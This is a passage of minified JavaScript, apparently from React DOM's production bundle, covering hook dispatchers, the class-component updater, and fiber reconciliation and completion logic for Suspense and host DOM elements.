l=n.lastRenderedState,i=a(l,t);if(r.hasEagerState=!0,r.eagerState=i,Me(i,l)){var o=n.interleaved;o===null?(r.next=r,Ll(n)):(r.next=o.next,o.next=r),n.interleaved=r;return}}catch{}finally{}t=Dc(e,n,r,s),t!==null&&(r=oe(),je(t,e,s,r),ru(t,n,s))}}function tu(e){var n=e.alternate;return e===U||n!==null&&n===U}function su(e,n){Mt=ar=!0;var t=e.pending;t===null?n.next=n:(n.next=t.next,t.next=n),e.pending=n}function ru(e,n,t){if(t&4194240){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,ml(e,t)}}var lr={readContext:_e,useCallback:se,useContext:se,useEffect:se,useImperativeHandle:se,useInsertionEffect:se,useLayoutEffect:se,useMemo:se,useReducer:se,useRef:se,useState:se,useDebugValue:se,useDeferredValue:se,useTransition:se,useMutableSource:se,useSyncExternalStore:se,useId:se,unstable_isNewReconciler:!1},Yd={readContext:_e,useCallback:function(e,n){return De().memoizedState=[e,n===void 0?null:n],e},useContext:_e,useEffect:Hi,useImperativeHandle:function(e,n,t){return t=t!=null?t.concat([e]):null,Ds(4194308,4,qc.bind(null,n,e),t)},useLayoutEffect:function(e,n){return Ds(4194308,4,e,n)},useInsertionEffect:function(e,n){return Ds(4,2,e,n)},useMemo:function(e,n){var t=De();return n=n===void 0?null:n,e=e(),t.memoizedState=[e,n],e},useReducer:function(e,n,t){var s=De();return n=t!==void 0?t(n):n,s.memoizedState=s.baseState=n,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},s.queue=e,e=e.dispatch=Gd.bind(null,U,e),[s.memoizedState,e]},useRef:function(e){var n=De();return e={current:e},n.memoizedState=e},useState:Ui,useDebugValue:zl,useDeferredValue:function(e){return De().memoizedState=e},useTransition:function(){var e=Ui(!1),n=e[0];return e=$d.bind(null,e[1]),De().memoizedState=e,[n,e]},useMutableSource:function(){},useSyncExternalStore:function(e,n,t){var s=U,r=De();if(B){if(t===void 0)throw Error(b(407));t=t()}else{if(t=n(),J===null)throw Error(b(349));jn&30||Hc(s,n,t)}r.memoizedState=t;var a={value:t,getSnapshot:n};return r.queue=a,Hi(Wc.bind(null,s,a,e),[e]),s.flags|=2048,es(9,Vc.bind(null,s,a,t,n),void 0,null),t},useId:function(){var e=De(),n=J.identifierPrefix;if(B){var t=$e,s=We;t=(s&~(1<<32-Ae(s)-1)).toString(32)+t,n=":"+n+"R"+t,t=Xt++,0<t&&(n+="H"+t.toString(32)),n+=":"}else t=Wd++,n=":"+n+"r"+t.toString(32)+":";return e.memoizedState=n},unstable_isNewReconciler:!1},Kd={readContext:_e,useCallback:Xc,useContext:_e,useEffect:Dl,useImperativeHandle:Zc,useInsertionEffect:Yc,useLayoutEffect:Kc,useMemo:Jc,useReducer:ea,useRef:Qc,useState:function(){return ea(Jt)},useDebugValue:zl,useDeferredValue:function(e){var n=Ce();return eu(n,K.memoizedState,e)},useTransition:function(){var e=ea(Jt)[0],n=Ce().memoizedState;return[e,n]},useMutableSource:Fc,useSyncExternalStore:Uc,useId:nu,unstable_isNewReconciler:!1},qd={readContext:_e,useCallback:Xc,useContext:_e,useEffect:Dl,useImperativeHandle:Zc,useInsertionEffect:Yc,useLayoutEffect:Kc,useMemo:Jc,useReducer:na,useRef:Qc,useState:function(){return na(Jt)},useDebugValue:zl,useDeferredValue:function(e){var n=Ce();return K===null?n.memoizedState=e:eu(n,K.memoizedState,e)},useTransition:function(){var e=na(Jt)[0],n=Ce().memoizedState;return[e,n]},useMutableSource:Fc,useSyncExternalStore:Uc,useId:nu,unstable_isNewReconciler:!1};function Ne(e,n){if(e&&e.defaultProps){n=H({},n),e=e.defaultProps;for(var t in e)n[t]===void 0&&(n[t]=e[t]);return n}return n}function Da(e,n,t,s){n=e.memoizedState,t=t(s,n),t=t==null?n:H({},n,t),e.memoizedState=t,e.lanes===0&&(e.updateQueue.baseState=t)}var br={isMounted:function(e){return(e=e._reactInternals)?zn(e)===e:!1},enqueueSetState:function(e,n,t){e=e._reactInternals;var s=oe(),r=hn(e),a=Ge(s,r);a.payload=n,t!=null&&(a.callback=t),n=pn(e,a,r),n!==null&&(je(n,e,r,s),Ms(n,e,r))},enqueueReplaceState:function(e,n,t){e=e._reactInternals;var s=oe(),r=hn(e),a=Ge(s,r);a.tag=1,a.payload=n,t!=null&&(a.callback=t),n=pn(e,a,r),n!==null&&(je(n,e,r,s),Ms(n,e,r))},enqueueForceUpdate:function(e,n){e=e._reactInternals;var t=oe(),s=hn(e),r=Ge(t,s);r.tag=2,n!=null&&(r.callback=n),n=pn(e,r,s),n!==null&&(je(n,e,s,t),Ms(n,e,s))}};function Vi(e,n,t,s,r,a,l){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(s,a,l):n.prototype&&n.prototype.isPureReactComponent?!Gt(t,s)||!Gt(r,a):!0}function au(e,n,t){var s=!1,r=vn,a=n.contextType;return typeof a=="object"&&a!==null?a=_e(a):(r=fe(n)?Rn:le.current,s=n.contextTypes,a=(s=s!=null)?lt(e,r):vn),n=new n(t,a),e.memoizedState=n.state!==null&&n.state!==void 0?n.state:null,n.updater=br,e.stateNode=n,n._reactInternals=e,s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=r,e.__reactInternalMemoizedMaskedChildContext=a),n}function Wi(e,n,t,s){e=n.state,typeof n.componentWillReceiveProps=="function"&&n.componentWillReceiveProps(t,s),typeof n.UNSAFE_componentWillReceiveProps=="function"&&n.UNSAFE_componentWillReceiveProps(t,s),n.state!==e&&br.enqueueReplaceState(n,n.state,null)}function za(e,n,t,s){var r=e.stateNode;r.props=t,r.state=e.memoizedState,r.refs={},Nl(e);var a=n.contextType;typeof a=="object"&&a!==null?r.context=_e(a):(a=fe(n)?Rn:le.current,r.context=lt(e,a)),r.state=e.memoizedState,a=n.getDerivedStateFromProps,typeof a=="function"&&(Da(e,n,a,t),r.state=e.memoizedState),typeof n.getDerivedStateFromProps=="function"||typeof r.getSnapshotBeforeUpdate=="function"||typeof r.UNSAFE_componentWillMount!="function"&&typeof r.componentWillMount!="function"||(n=r.state,typeof r.componentWillMount=="function"&&r.componentWillMount(),typeof r.UNSAFE_componentWillMount=="function"&&r.UNSAFE_componentWillMount(),n!==r.state&&br.enqueueReplaceState(r,r.state,null),sr(e,t,r,s),r.state=e.memoizedState),typeof r.componentDidMount=="function"&&(e.flags|=4194308)}function ut(e,n){try{var t="",s=n;do t+=Ep(s),s=s.return;while(s);var r=t}catch(a){r=`
Error generating stack: `+a.message+`
`+a.stack}return{value:e,source:n,stack:r,digest:null}}function ta(e,n,t){return{value:e,source:null,stack:t??null,digest:n??null}}function Ba(e,n){try{console.error(n.value)}catch(t){setTimeout(function(){throw t})}}var Zd=typeof WeakMap=="function"?WeakMap:Map;function lu(e,n,t){t=Ge(-1,t),t.tag=3,t.payload={element:null};var s=n.value;return t.callback=function(){or||(or=!0,Ka=s),Ba(e,n)},t}function iu(e,n,t){t=Ge(-1,t),t.tag=3;var s=e.type.getDerivedStateFromError;if(typeof s=="function"){var r=n.value;t.payload=function(){return s(r)},t.callback=function(){Ba(e,n)}}var a=e.stateNode;return a!==null&&typeof a.componentDidCatch=="function"&&(t.callback=function(){Ba(e,n),typeof s!="function"&&(dn===null?dn=new Set([this]):dn.add(this));var l=n.stack;this.componentDidCatch(n.value,{componentStack:l!==null?l:""})}),t}function $i(e,n,t){var s=e.pingCache;if(s===null){s=e.pingCache=new Zd;var r=new Set;s.set(n,r)}else r=s.get(n),r===void 0&&(r=new Set,s.set(n,r));r.has(t)||(r.add(t),e=ph.bind(null,e,n,t),n.then(e,e))}function Gi(e){do{var n;if((n=e.tag===13)&&(n=e.memoizedState,n=n!==null?n.dehydrated!==null:!0),n)return e;e=e.return}while(e!==null);return null}function Qi(e,n,t,s,r){return e.mode&1?(e.flags|=65536,e.lanes=r,e):(e===n?e.flags|=65536:(e.flags|=128,t.flags|=131072,t.flags&=-52805,t.tag===1&&(t.alternate===null?t.tag=17:(n=Ge(-1,1),n.tag=2,pn(t,n,1))),t.lanes|=1),e)}var Xd=Ze.ReactCurrentOwner,de=!1;function ie(e,n,t,s){n.child=e===null?Ic(n,null,t,s):ot(n,e.child,t,s)}function Yi(e,n,t,s,r){t=t.render;var a=n.ref;return st(n,r),s=Ml(e,n,t,s,a,r),t=Il(),e!==null&&!de?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,qe(e,n,r)):(B&&t&&Sl(n),n.flags|=1,ie(e,n,s,r),n.child)}function Ki(e,n,t,s,r){if(e===null){var a=t.type;return typeof a=="function"&&!Gl(a)&&a.defaultProps===void 0&&t.compare===null&&t.defaultProps===void 0?(n.tag=15,n.type=a,ou(e,n,a,s,r)):(e=Us(t.type,null,s,n,n.mode,r),e.ref=n.ref,e.return=n,n.child=e)}if(a=e.child,!(e.lanes&r)){var l=a.memoizedProps;if(t=t.compare,t=t!==null?t:Gt,t(l,s)&&e.ref===n.ref)return qe(e,n,r)}return n.flags|=1,e=fn(a,s),e.ref=n.ref,e.return=n,n.child=e}function ou(e,n,t,s,r){if(e!==null){var a=e.memoizedProps;if(Gt(a,s)&&e.ref===n.ref)if(de=!1,n.pendingProps=s=a,(e.lanes&r)!==0)e.flags&131072&&(de=!0);else return n.lanes=e.lanes,qe(e,n,r)}return Fa(e,n,t,s,r)}function cu(e,n,t){var s=n.pendingProps,r=s.children,a=e!==null?e.memoizedState:null;if(s.mode==="hidden")if(!(n.mode&1))n.memoizedState={baseLanes:0,cachePool:null,transitions:null},I(Xn,ge),ge|=t;else{if(!(t&1073741824))return e=a!==null?a.baseLanes|t:t,n.lanes=n.childLanes=1073741824,n.memoizedState={baseLanes:e,cachePool:null,transitions:null},n.updateQueue=null,I(Xn,ge),ge|=e,null;n.memoizedState={baseLanes:0,cachePool:null,transitions:null},s=a!==null?a.baseLanes:t,I(Xn,ge),ge|=s}else a!==null?(s=a.baseLanes|t,n.memoizedState=null):s=t,I(Xn,ge),ge|=s;return ie(e,n,r,t),n.child}function uu(e,n){var t=n.ref;(e===null&&t!==null||e!==null&&e.ref!==t)&&(n.flags|=512,n.flags|=2097152)}function Fa(e,n,t,s,r){var a=fe(t)?Rn:le.current;return a=lt(n,a),st(n,r),t=Ml(e,n,t,s,a,r),s=Il(),e!==null&&!de?(n.updateQueue=e.updateQueue,n.flags&=-2053,e.lanes&=~r,qe(e,n,r)):(B&&s&&Sl(n),n.flags|=1,ie(e,n,t,r),n.child)}function qi(e,n,t,s,r){if(fe(t)){var a=!0;Xs(n)}else a=!1;if(st(n,r),n.stateNode===null)zs(e,n),au(n,t,s),za(n,t,s,r),s=!0;else if(e===null){var l=n.stateNode,i=n.memoizedProps;l.props=i;var o=l.context,u=t.contextType;typeof u=="object"&&u!==null?u=_e(u):(u=fe(t)?Rn:le.current,u=lt(n,u));var g=t.getDerivedStateFromProps,f=typeof g=="function"||typeof l.getSnapshotBeforeUpdate=="function";f||typeof l.UNSAFE_componentWillReceiveProps!="function"&&typeof l.componentWillReceiveProps!="function"||(i!==s||o!==u)&&Wi(n,l,s,u),en=!1;var m=n.memoizedState;l.state=m,sr(n,s,l,r),o=n.memoizedState,i!==s||m!==o||he.current||en?(typeof g=="function"&&(Da(n,t,g,s),o=n.memoizedState),(i=en||Vi(n,t,i,s,m,o,u))?(f||typeof l.UNSAFE_componentWillMount!="function"&&typeof l.componentWillMount!="function"||(typeof l.componentWillMount=="function"&&l.componentWillMount(),typeof l.UNSAFE_componentWillMount=="function"&&l.UNSAFE_componentWillMount()),typeof l.componentDidMount=="function"&&(n.flags|=4194308)):(typeof l.componentDidMount=="function"&&(n.flags|=4194308),n.memoizedProps=s,n.memoizedState=o),l.props=s,l.state=o,l.context=u,s=i):(typeof l.componentDidMount=="function"&&(n.flags|=4194308),s=!1)}else{l=n.stateNode,zc(e,n),i=n.memoizedProps,u=n.type===n.elementType?i:Ne(n.type,i),l.props=u,f=n.pendingProps,m=l.context,o=t.contextType,typeof o=="object"&&o!==null?o=_e(o):(o=fe(t)?Rn:le.current,o=lt(n,o));var v=t.getDerivedStateFromProps;(g=typeof v=="function"||typeof l.getSnapshotBeforeUpdate=="function")||typeof l.UNSAFE_componentWillReceiveProps!="function"&&typeof l.componentWillReceiveProps!="function"||(i!==f||m!==o)&&Wi(n,l,s,o),en=!1,m=n.memoizedState,l.state=m,sr(n,s,l,r);var k=n.memoizedState;i!==f||m!==k||he.current||en?(typeof v=="function"&&(Da(n,t,v,s),k=n.memoizedState),(u=en||Vi(n,t,u,s,m,k,o)||!1)?(g||typeof l.UNSAFE_componentWillUpdate!="function"&&typeof l.componentWillUpdate!="function"||(typeof l.componentWillUpdate=="function"&&l.componentWillUpdate(s,k,o),typeof l.UNSAFE_componentWillUpdate=="function"&&l.UNSAFE_componentWillUpdate(s,k,o)),typeof l.componentDidUpdate=="function"&&(n.flags|=4),typeof l.getSnapshotBeforeUpdate=="function"&&(n.flags|=1024)):(typeof l.componentDidUpdate!="function"||i===e.memoizedProps&&m===e.memoizedState||(n.flags|=4),typeof l.getSnapshotBeforeUpdate!="function"||i===e.memoizedProps&&m===e.memoizedState||(n.flags|=1024),n.memoizedProps=s,n.memoizedState=k),l.props=s,l.state=k,l.context=o,s=u):(typeof l.componentDidUpdate!="function"||i===e.memoizedProps&&m===e.memoizedState||(n.flags|=4),typeof l.getSnapshotBeforeUpdate!="function"||i===e.memoizedProps&&m===e.memoizedState||(n.flags|=1024),s=!1)}return Ua(e,n,t,s,a,r)}function Ua(e,n,t,s,r,a){uu(e,n);var l=(n.flags&128)!==0;if(!s&&!l)return r&&Mi(n,t,!1),qe(e,n,a);s=n.stateNode,Xd.current=n;var i=l&&typeof t.getDerivedStateFromError!="function"?null:s.render();return n.flags|=1,e!==null&&l?(n.child=ot(n,e.child,null,a),n.child=ot(n,null,i,a)):ie(e,n,i,a),n.memoizedState=s.state,r&&Mi(n,t,!0),n.child}function pu(e){var n=e.stateNode;n.pendingContext?ji(e,n.pendingContext,n.pendingContext!==n.context):n.context&&ji(e,n.context,!1),Ol(e,n.containerInfo)}function Zi(e,n,t,s,r){return it(),Tl(r),n.flags|=256,ie(e,n,t,s),n.child}var Ha={dehydrated:null,treeContext:null,retryLane:0};function Va(e){return{baseLanes:e,cachePool:null,transitions:null}}function du(e,n,t){var s=n.pendingProps,r=F.current,a=!1,l=(n.flags&128)!==0,i;if((i=l)||(i=e!==null&&e.memoizedState===null?!1:(r&2)!==0),i?(a=!0,n.flags&=-129):(e===null||e.memoizedState!==null)&&(r|=1),I(F,r&1),e===null)return Ma(n),e=n.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(n.mode&1?e.data==="$!"?n.lanes=8:n.lanes=1073741824:n.lanes=1,null):(l=s.children,e=s.fallback,a?(s=n.mode,a=n.child,l={mode:"hidden",children:l},!(s&1)&&a!==null?(a.childLanes=0,a.pendingProps=l):a=Er(l,s,0,null),e=On(e,s,t,null),a.return=n,e.return=n,a.sibling=e,n.child=a,n.child.memoizedState=Va(t),n.memoizedState=Ha,e):Bl(n,l));if(r=e.memoizedState,r!==null&&(i=r.dehydrated,i!==null))return Jd(e,n,l,s,i,r,t);if(a){a=s.fallback,l=n.mode,r=e.child,i=r.sibling;var o={mode:"hidden",children:s.children};return!(l&1)&&n.child!==r?(s=n.child,s.childLanes=0,s.pendingProps=o,n.deletions=null):(s=fn(r,o),s.subtreeFlags=r.subtreeFlags&14680064),i!==null?a=fn(i,a):(a=On(a,l,t,null),a.flags|=2),a.return=n,s.return=n,s.sibling=a,n.child=s,s=a,a=n.child,l=e.child.memoizedState,l=l===null?Va(t):{baseLanes:l.baseLanes|t,cachePool:null,transitions:l.transitions},a.memoizedState=l,a.childLanes=e.childLanes&~t,n.memoizedState=Ha,s}return a=e.child,e=a.sibling,s=fn(a,{mode:"visible",children:s.children}),!(n.mode&1)&&(s.lanes=t),s.return=n,s.sibling=null,e!==null&&(t=n.deletions,t===null?(n.deletions=[e],n.flags|=16):t.push(e)),n.child=s,n.memoizedState=null,s}function Bl(e,n){return n=Er({mode:"visible",children:n},e.mode,0,null),n.return=e,e.child=n}function _s(e,n,t,s){return s!==null&&Tl(s),ot(n,e.child,null,t),e=Bl(n,n.pendingProps.children),e.flags|=2,n.memoizedState=null,e}function Jd(e,n,t,s,r,a,l){if(t)return n.flags&256?(n.flags&=-257,s=ta(Error(b(422))),_s(e,n,l,s)):n.memoizedState!==null?(n.child=e.child,n.flags|=128,null):(a=s.fallback,r=n.mode,s=Er({mode:"visible",children:s.children},r,0,null),a=On(a,r,l,null),a.flags|=2,s.return=n,a.return=n,s.sibling=a,n.child=s,n.mode&1&&ot(n,e.child,null,l),n.child.memoizedState=Va(l),n.memoizedState=Ha,a);if(!(n.mode&1))return _s(e,n,l,null);if(r.data==="$!"){if(s=r.nextSibling&&r.nextSibling.dataset,s)var i=s.dgst;return s=i,a=Error(b(419)),s=ta(a,s,void 0),_s(e,n,l,s)}if(i=(l&e.childLanes)!==0,de||i){if(s=J,s!==null){switch(l&-l){case 4:r=2;break;case 16:r=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:r=32;break;case 536870912:r=268435456;break;default:r=0}r=r&(s.suspendedLanes|l)?0:r,r!==0&&r!==a.retryLane&&(a.retryLane=r,Ke(e,r),je(s,e,r,-1))}return $l(),s=ta(Error(b(421))),_s(e,n,l,s)}return r.data==="$?"?(n.flags|=128,n.child=e.child,n=dh.bind(null,e),r._reactRetry=n,null):(e=a.treeContext,ve=un(r.nextSibling),ye=n,B=!0,Re=null,e!==null&&(xe[Se++]=We,xe[Se++]=$e,xe[Se++]=An,We=e.id,$e=e.overflow,An=n),n=Bl(n,s.children),n.flags|=4096,n)}function Xi(e,n,t){e.lanes|=n;var s=e.alternate;s!==null&&(s.lanes|=n),Ia(e.return,n,t)}function sa(e,n,t,s,r){var a=e.memoizedState;a===null?e.memoizedState={isBackwards:n,rendering:null,renderingStartTime:0,last:s,tail:t,tailMode:r}:(a.isBackwards=n,a.rendering=null,a.renderingStartTime=0,a.last=s,a.tail=t,a.tailMode=r)}function hu(e,n,t){var s=n.pendingProps,r=s.revealOrder,a=s.tail;if(ie(e,n,s.children,t),s=F.current,s&2)s=s&1|2,n.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=n.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Xi(e,t,n);else if(e.tag===19)Xi(e,t,n);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break e;for(;e.sibling===null;){if(e.return===null||e.return===n)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}s&=1}if(I(F,s),!(n.mode&1))n.memoizedState=null;else switch(r){case"forwards":for(t=n.child,r=null;t!==null;)e=t.alternate,e!==null&&rr(e)===null&&(r=t),t=t.sibling;t=r,t===null?(r=n.child,n.child=null):(r=t.sibling,t.sibling=null),sa(n,!1,r,t,a);break;case"backwards":for(t=null,r=n.child,n.child=null;r!==null;){if(e=r.alternate,e!==null&&rr(e)===null){n.child=r;break}e=r.sibling,r.sibling=t,t=r,r=e}sa(n,!0,t,null,a);break;case"together":sa(n,!1,null,null,void 0);break;default:n.memoizedState=null}return n.child}function zs(e,n){!(n.mode&1)&&e!==null&&(e.alternate=null,n.alternate=null,n.flags|=2)}function qe(e,n,t){if(e!==null&&(n.dependencies=e.dependencies),Mn|=n.lanes,!(t&n.childLanes))return null;if(e!==null&&n.child!==e.child)throw Error(b(153));if(n.child!==null){for(e=n.child,t=fn(e,e.pendingProps),n.child=t,t.return=n;e.sibling!==null;)e=e.sibling,t=t.sibling=fn(e,e.pendingProps),t.return=n;t.sibling=null}return n.child}function eh(e,n,t){switch(n.tag){case 3:pu(n),it();break;case 5:Bc(n);break;case 1:fe(n.type)&&Xs(n);break;case 4:Ol(n,n.stateNode.containerInfo);break;case 10:var s=n.type._context,r=n.memoizedProps.value;I(nr,s._currentValue),s._currentValue=r;break;case 13:if(s=n.memoizedState,s!==null)return s.dehydrated!==null?(I(F,F.current&1),n.flags|=128,null):t&n.child.childLanes?du(e,n,t):(I(F,F.current&1),e=qe(e,n,t),e!==null?e.sibling:null);I(F,F.current&1);break;case 19:if(s=(t&n.childLanes)!==0,e.flags&128){if(s)return hu(e,n,t);n.flags|=128}if(r=n.memoizedState,r!==null&&(r.rendering=null,r.tail=null,r.lastEffect=null),I(F,F.current),s)break;return null;case 22:case 23:return n.lanes=0,cu(e,n,t)}return qe(e,n,t)}var fu,Wa,mu,gu;fu=function(e,n){for(var t=n.child;t!==null;){if(t.tag===5||t.tag===6)e.appendChild(t.stateNode);else if(t.tag!==4&&t.child!==null){t.child.return=t,t=t.child;continue}if(t===n)break;for(;t.sibling===null;){if(t.return===null||t.return===n)return;t=t.return}t.sibling.return=t.return,t=t.sibling}};Wa=function(){};mu=function(e,n,t,s){var r=e.memoizedProps;if(r!==s){e=n.stateNode,Ln(Fe.current);var a=null;switch(t){case"input":r=da(e,r),s=da(e,s),a=[];break;case"select":r=H({},r,{value:void 0}),s=H({},s,{value:void 0}),a=[];break;case"textarea":r=ma(e,r),s=ma(e,s),a=[];break;default:typeof r.onClick!="function"&&typeof s.onClick=="function"&&(e.onclick=qs)}va(t,s);var l;t=null;for(u in r)if(!s.hasOwnProperty(u)&&r.hasOwnProperty(u)&&r[u]!=null)if(u==="style"){var i=r[u];for(l in i)i.hasOwnProperty(l)&&(t||(t={}),t[l]="")}else u!=="dangerouslySetInnerHTML"&&u!=="children"&&u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&u!=="autoFocus"&&(Bt.hasOwnProperty(u)?a||(a=[]):(a=a||[]).push(u,null));for(u in s){var o=s[u];if(i=r!=null?r[u]:void 0,s.hasOwnProperty(u)&&o!==i&&(o!=null||i!=null))if(u==="style")if(i){for(l in i)!i.hasOwnProperty(l)||o&&o.hasOwnProperty(l)||(t||(t={}),t[l]="");for(l in o)o.hasOwnProperty(l)&&i[l]!==o[l]&&(t||(t={}),t[l]=o[l])}else t||(a||(a=[]),a.push(u,t)),t=o;else u==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,i=i?i.__html:void 0,o!=null&&i!==o&&(a=a||[]).push(u,o)):u==="children"?typeof o!="string"&&typeof o!="number"||(a=a||[]).push(u,""+o):u!=="suppressContentEditableWarning"&&u!=="suppressHydrationWarning"&&(Bt.hasOwnProperty(u)?(o!=null&&u==="onScroll"&&D("scroll",e),a||i===o||(a=[])):(a=a||[]).push(u,o))}t&&(a=a||[]).push("style",t);var u=a;(n.updateQueue=u)&&(n.flags|=4)}};gu=function(e,n,t,s){t!==s&&(n.flags|=4)};function Et(e,n){if(!B)switch(e.tailMode){case"hidden":n=e.tail;for(var t=null;n!==null;)n.alternate!==null&&(t=n),n=n.sibling;t===null?e.tail=null:t.sibling=null;break;case"collapsed":t=e.tail;for(var s=null;t!==null;)t.alternate!==null&&(s=t),t=t.sibling;s===null?n||e.tail===null?e.tail=null:e.tail.sibling=null:s.sibling=null}}function re(e){var n=e.alternate!==null&&e.alternate.child===e.child,t=0,s=0;if(n)for(var r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags&14680064,s|=r.flags&14680064,r.return=e,r=r.sibling;else for(r=e.child;r!==null;)t|=r.lanes|r.childLanes,s|=r.subtreeFlags,s|=r.flags,r.return=e,r=r.sibling;return e.subtreeFlags|=s,e.childLanes=t,n}function nh(e,n,t){var s=n.pendingProps;switch(El(n),n.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return re(n),null;case 1:return fe(n.type)&&Zs(),re(n),null;case 3:return s=n.stateNode,ct(),z(he),z(le),Al(),s.pendingContext&&(s.context=s.pendingContext,s.pendingContext=null),(e===null||e.child===null)&&(Es(n)?n.flags|=4:e===null||e.memoizedState.isDehydrated&&!(n.flags&256)||(n.flags|=1024,Re!==null&&(Xa(Re),Re=null))),Wa(e,n),re(n),null;case 5:Rl(n);var r=Ln(Zt.current);if(t=n.type,e!==null&&n.stateNode!=null)mu(e,n,t,s,r),e.ref!==n.ref&&(n.flags|=512,n.flags|=2097152);else{if(!s){if(n.stateNode===null)throw Error(b(166));return re(n),null}if(e=Ln(Fe.current),Es(n)){s=n.stateNode,t=n.type;var a=n.memoizedProps;switch(s[ze]=n,s[Kt]=a,e=(n.mode&1)!==0,t){case"dialog":D("cancel",s),D("close",s);break;case"iframe":case"object":case"embed":D("load",s);break;case"video":case"audio":for(r=0;r<Lt.length;r++)D(Lt[r],s);break;case"source":D("error",s);break;case"img":case"image":case"link":D("error",s),D("load",s);break;case"details":D("toggle",s);break;case"input":ii(s,a),D("invalid",s);break;case"select":s._wrapperState={wasMultiple:!!a.multiple},D("invalid",s);break;case"textarea":ci(s,a),D("invalid",s)}va(t,a),r=null;for(var l in a)if(a.hasOwnProperty(l)){var i=a[l];l==="children"?typeof i=="string"?s.textContent!==i&&(a.suppressHydrationWarning!==!0&&Ss(s.textContent,i,e),r=["children",i]):typeof i=="number"&&s.textContent!==""+i&&(a.suppressHydrationWarning!==!0&&Ss(s.textContent,i,e),r=["children",""+i]):Bt.hasOwnProperty(l)&&i!=null&&l==="onScroll"&&D("scroll",s)}switch(t){case"input":ms(s),oi(s,a,!0);break;case"textarea":ms(s),ui(s);break;case"select":case"option":break;default:typeof a.onClick=="function"&&(s.onclick=qs)}s=r,n.updateQueue=s,s!==null&&(n.flags|=4)}else{l=r.nodeType===9?r:r.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=Wo(t)),e==="http://www.w3.org/1999/xhtml"?t==="script"?(e=l.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof s.is=="string"?e=l.createElement(t,{is:s.is}):(e=l.createElement(t),t==="select"&&(l=e,s.multiple?l.multiple=!0:s.size&&(l.size=s.size))):e=l.createElementNS(e,t),e[ze]=n,e[Kt]=s,fu(e,n,!1,!1),n.stateNode=e;e:{switch(l=ya(t,s),t){case"dialog":D("cancel",e),D("close",e),r=s;break;case"iframe":case"object":case"embed":D("load",e),r=s;break;case"video":case"audio":for(r=0;r<Lt.length;r++)D(Lt[r],e);r=s;break;case"source":D("error",e),r=s;break;case"img":case"image":case"link":D("error",e),D("load",e),r=s;break;case"details":D("toggle",e),r=s;break;case"input":ii(e,s),r=da(e,s),D("invalid",e);break;case"option":r=s;break;case"select":e._wrapperState={wasMultiple:!!s.multiple},r=H({},s,{value:void 0}),D("invalid",e);break;case"textarea":ci(e,s),r=ma(e,s),D("invalid",e);break;default:r=s}va(t,r),i=r;for(a in i)if(i.hasOwnProperty(a)){var o=i[a];a==="style"?Qo(e,o):a==="dangerouslySetInnerHTML"?(o=o?o.__html:void 0,o!=null&&$o(e,o)):a==="children"?typeof o=="string"?(t!=="textarea"||o!=="")&&Ft(e,o):typeof o=="number"&&Ft(e,""+o):a!=="suppressContentEditableWarning"&&a!=="suppressHydrationWarning"&&a!=="autoFocus"&&(Bt.hasOwnProperty(a)?o!=null&&a==="onScroll"&&D("scroll",e):o!=null&&cl(e,a,o,l))}switch(t){case"input":ms(e),oi(e,s,!1);break;case"textarea":ms(e),ui(e);break;case"option":s.value!=null&&e.setAttribute("value",""+gn(s.value));break;case"select":e.multiple=!!s.multiple,a=s.value,a!=null?Jn(e,!!s.multiple,a,!1):s.defaultValue!=null&&Jn(e,!!s.multiple,s.defaultValue,!0);break;default:typeof r.onClick=="function"&&(e.onclick=qs)}switch(t){case"button":case"input":case"select":case"textarea":s=!!s.autoFocus;break e;case"img":s=!0;break e;default:s=!1}}s&&(n.flags|=4)}n.ref!==null&&(n.flags|=512,n.flags|=2097152)}return re(n),null;case 6:if(e&&n.stateNode!=null)gu(e,n,e.memoizedProps,s);else{if(typeof s!="string"&&n.stateNode===null)throw Error(b(166));if(t=Ln(Zt.current),Ln(Fe.current),Es(n)){if(s=n.stateNode,t=n.memoizedProps,s[ze]=n,(a=s.nodeValue!==t)&&(e=ye,e!==null))switch(e.tag){case 3:Ss(s.nodeValue,t,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&Ss(s.nodeValue,t,(e.mode&1)!==0)}a&&(n.flags|=4)}else s=(t.nodeType===9?t:t.ownerDocument).createTextNode(s),s[ze]=n,n.stateNode=s}return re(n),null;case 13:if(z(F),s=n.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(B&&ve!==null&&n.mode&1&&!(n.flags&128))jc(),it(),n.flags|=98560,a=!1;else if(a=Es(n),s!==null&&s.dehydrated!==null){if(e===null){if(!a)throw Error(b(318));if(a=n.memoizedState,a=a!==null?a.dehydrated:null,!a)throw Error(b(317));a[ze]=n}else it(),!(n.flags&128)&&(n.memoizedState=null),n.flags|=4;re(n),a=!1}else Re!==null&&(Xa(Re),Re=null),a=!0;if(!a)return n.flags&65536?n:null}return n.flags&128?(n.lanes=t,n):(s=s!==null,s!==(e!==null&&e.memoizedState!==null)&&s&&(n.child.flags|=8192,n.mode&1&&(e===null||F.current&1?q===0&&(q=3):$l())),n.updateQueue!==null&&(n.flags|=4),re(n),null);case 4:return ct(),Wa(e,n),e===null&&Qt(n.stateNode.containerInfo),re(n),null;case 10:return Pl(n.type._context),re(n),null;case 17:return fe(n.type)&&Zs(),re(n),null;case 19:if(z(F),a=n.memoizedState,a===null)return 